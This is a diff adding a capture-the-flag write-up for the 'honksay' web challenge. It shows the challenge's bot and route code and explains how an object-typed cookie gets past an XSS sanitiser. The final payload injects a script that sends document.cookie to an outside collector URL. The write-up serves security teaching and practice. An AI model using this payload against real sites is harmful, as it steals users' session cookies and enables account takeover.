@@ -1,0 +1,85 @@
+I"6'<p><em>Haha goose say funny thing</em></p>
+
+<p><a href="https://ctf2022.maplebacon.org/files/0565426a10b6e02a4fd2dcc6ca720ab0/honksay.tar.gz">Download challenge</a></p>
+
+<p><br /></p>
+
+<h2 id="investigation">Investigation</h2>
+
+<p>Honksay challenge presents itself with this glorious page</p>
+
+<p><img src="/assets/honksay.png" alt="honk" />
+<br />
+<br /></p>
+
+<p>Looking onto its code we see that website’s backend has a goose script, where a puppeteer instance is created. This instance visits every page you specify in feedback field and sets flag cookie to environment variable. The only obstacle is that cookie is only visible for localhost.</p>
+
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">const</span> <span class="nx">puppeteer</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="dl">'</span><span class="s1">puppeteer</span><span class="dl">'</span><span class="p">);</span>
+<span class="kd">const</span> <span class="nx">FLAG</span> <span class="o">=</span> <span class="nx">process</span><span class="p">.</span><span class="nx">env</span><span class="p">.</span><span class="nx">FLAG</span> <span class="o">||</span> <span class="dl">"</span><span class="s2">maple{fake}</span><span class="dl">"</span><span class="p">;</span>
+
+<span class="p">...</span>
+
+<span class="nx">page</span> <span class="o">=</span> <span class="k">await</span> <span class="nx">browser</span><span class="p">.</span><span class="nx">newPage</span><span class="p">();</span>
+<span class="k">await</span> <span class="nx">page</span><span class="p">.</span><span class="nx">setCookie</span><span class="p">({</span>
+      <span class="na">name</span><span class="p">:</span> <span class="dl">'</span><span class="s1">flag</span><span class="dl">'</span><span class="p">,</span>
+      <span class="na">value</span><span class="p">:</span> <span class="nx">FLAG</span><span class="p">,</span>
+      <span class="na">domain</span><span class="p">:</span> <span class="dl">'</span><span class="s1">localhost</span><span class="dl">'</span><span class="p">,</span>
+      <span class="na">samesite</span><span class="p">:</span> <span class="dl">'</span><span class="s1">none</span><span class="dl">'</span>
+<span class="p">});</span>
+<span class="k">await</span> <span class="nx">page</span><span class="p">.</span><span class="nx">goto</span><span class="p">(</span><span class="nx">url</span><span class="p">,</span> <span class="p">{</span><span class="na">waitUntil</span> <span class="p">:</span> <span class="dl">'</span><span class="s1">networkidle2</span><span class="dl">'</span> <span class="p">}).</span><span class="k">catch</span><span class="p">(</span><span class="nx">e</span> <span class="o">=&gt;</span> <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">e</span><span class="p">));</span>
+</code></pre></div></div>
+
+<p>Digging in the other script reveals that website has <code class="language-plaintext highlighter-rouge">/changehonk</code> route that can set our message on the frontend.</p>
+
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">app</span><span class="p">.</span><span class="kd">get</span><span class="p">(</span><span class="dl">'</span><span class="s1">/changehonk</span><span class="dl">'</span><span class="p">,</span> <span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
+    <span class="nx">res</span><span class="p">.</span><span class="nx">cookie</span><span class="p">(</span><span class="dl">'</span><span class="s1">honk</span><span class="dl">'</span><span class="p">,</span> <span class="nx">req</span><span class="p">.</span><span class="nx">query</span><span class="p">.</span><span class="nx">newhonk</span><span class="p">,</span> <span class="p">{</span>
+        <span class="na">httpOnly</span><span class="p">:</span> <span class="kc">true</span>
+    <span class="p">});</span>
+    <span class="nx">res</span><span class="p">.</span><span class="nx">cookie</span><span class="p">(</span><span class="dl">'</span><span class="s1">honkcount</span><span class="dl">'</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="p">{</span>
+        <span class="na">httpOnly</span><span class="p">:</span> <span class="kc">true</span>
+    <span class="p">});</span>
+    <span class="nx">res</span><span class="p">.</span><span class="nx">redirect</span><span class="p">(</span><span class="dl">'</span><span class="s1">/</span><span class="dl">'</span><span class="p">);</span>
+<span class="p">});</span>
+</code></pre></div></div>
+
+<p>Well that is nothing like stored XSS, except there is one problem : upon visiting baseurl backend performs a little check with ‘xss’ plugin</p>
+
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">const</span> <span class="nx">clean</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="dl">'</span><span class="s1">xss</span><span class="dl">'</span><span class="p">);</span>
+
+<span class="p">...</span>
+
+<span class="nx">app</span><span class="p">.</span><span class="kd">get</span><span class="p">(</span><span class="dl">'</span><span class="s1">/</span><span class="dl">'</span><span class="p">,</span> <span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
+    <span class="k">if</span> <span class="p">(</span><span class="nx">req</span><span class="p">.</span><span class="nx">cookies</span><span class="p">.</span><span class="nx">honk</span><span class="p">){</span>
+        <span class="c1">//construct object</span>
+        <span class="kd">let</span> <span class="nx">finalhonk</span> <span class="o">=</span> <span class="p">{};</span>
+        <span class="k">if</span> <span class="p">(</span><span class="k">typeof</span><span class="p">(</span><span class="nx">req</span><span class="p">.</span><span class="nx">cookies</span><span class="p">.</span><span class="nx">honk</span><span class="p">)</span> <span class="o">===</span> <span class="dl">'</span><span class="s1">object</span><span class="dl">'</span><span class="p">){</span>
+            <span class="nx">finalhonk</span> <span class="o">=</span> <span class="nx">req</span><span class="p">.</span><span class="nx">cookies</span><span class="p">.</span><span class="nx">honk</span>
+        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+            <span class="nx">finalhonk</span> <span class="o">=</span> <span class="p">{</span>
+                <span class="na">message</span><span class="p">:</span> <span class="nx">clean</span><span class="p">(</span><span class="nx">req</span><span class="p">.</span><span class="nx">cookies</span><span class="p">.</span><span class="nx">honk</span><span class="p">),</span> 
+                <span class="na">amountoftimeshonked</span><span class="p">:</span> <span class="nx">req</span><span class="p">.</span><span class="nx">cookies</span><span class="p">.</span><span class="nx">honkcount</span><span class="p">.</span><span class="nx">toString</span><span class="p">()</span>
+            <span class="p">};</span>
+        <span class="p">}</span>
+        <span class="nx">res</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="nx">template</span><span class="p">(</span><span class="nx">finalhonk</span><span class="p">.</span><span class="nx">message</span><span class="p">,</span> <span class="nx">finalhonk</span><span class="p">.</span><span class="nx">amountoftimeshonked</span><span class="p">));</span>
+    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+        <span class="kd">const</span> <span class="nx">initialhonk</span> <span class="o">=</span> <span class="dl">'</span><span class="s1">HONK</span><span class="dl">'</span><span class="p">;</span>
+        <span class="nx">res</span><span class="p">.</span><span class="nx">cookie</span><span class="p">(</span><span class="dl">'</span><span class="s1">honk</span><span class="dl">'</span><span class="p">,</span> <span class="nx">initialhonk</span><span class="p">,</span> <span class="p">{</span>
+            <span class="na">httpOnly</span><span class="p">:</span> <span class="kc">true</span>
+        <span class="p">});</span>
+        <span class="nx">res</span><span class="p">.</span><span class="nx">cookie</span><span class="p">(</span><span class="dl">'</span><span class="s1">honkcount</span><span class="dl">'</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="p">{</span>
+            <span class="na">httpOnly</span><span class="p">:</span> <span class="kc">true</span>
+        <span class="p">});</span>
+        <span class="nx">res</span><span class="p">.</span><span class="nx">redirect</span><span class="p">(</span><span class="dl">'</span><span class="s1">/</span><span class="dl">'</span><span class="p">);</span>
+    <span class="p">}</span>
+<span class="p">});</span>
+</code></pre></div></div>
+
+<p>Turns out we can get around this check, by setting our cookie to an instance of an object, and then finalhonk will get assigned to user controlled honk cookie.</p>
+
+<h2 id="payload">Payload</h2>
+
+<p>To set cookie type to and object via a GET request we can construct this payload:</p>
+
+<p><code class="language-plaintext highlighter-rouge">http://localhost:9988/changehonk?newhonk[message]=&lt;script&gt;fetch(\</code>https://putsreq.com/nVXmm9ia90BBByv1Qx7H?${document.cookie}<code class="language-plaintext highlighter-rouge">);&lt;/script&gt;</code></p>
+
+:ET
